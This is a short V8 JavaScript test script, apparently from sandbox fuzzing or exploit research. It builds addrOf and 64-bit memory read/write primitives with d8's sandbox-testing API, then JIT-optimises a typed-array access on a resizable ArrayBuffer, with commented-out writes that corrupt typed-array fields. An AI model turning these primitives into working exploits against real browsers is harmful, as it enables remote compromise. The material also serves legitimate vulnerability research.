// r --expose-gc --allow-natives-syntax --sandbox-testing --print-code  ~/v8_sb_fuzz/sandbox_fuzzer/a2.js
// gdb --args /home/vult/v8_sb_fuzz/v8/out/debug/d8 --expose-gc --allow-natives-syntax --sandbox-testing --trace-turbo --print-code   ~/v8_sb_fuzz/sandbox_fuzzer/a2.js

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }



// const gsab = new SharedArrayBuffer(0x16,{"maxByteLength":0x4242}); // gsab
// const u16arr = new Uint16Array(gsab,0x10);

const rab = new ArrayBuffer(16, {maxByteLength: 1024});
const u16arr = new Uint16Array(rab);

u16arr[1] = 0x2;
// console.log(u16arr[1]);

function foo(obj,index, val) {
    obj[index] += val;
    return obj[index];

}

function test(iii,val) {
    return foo(u16arr, iii, val);
}

for (var i = 0; i < 0x10000; ++i) {
    test(1,0);
}


// %DebugPrint(test);

// console.log(addrOf(u16arr).toString(16));
// console.log(v8_read64(addrOf(u16arr)+0x17).toString(16));

// let target = Number(0x20000000000n);
// v8_write64(addrOf(u16arr)+0x19,0x2e00000n);

// %DebugPrint(gsab);
// %DebugPrint(u16arr);
// %DebugPrint(u16arr);
// %DebugPrint(target);

//%SystemBreak();

test(2,0);
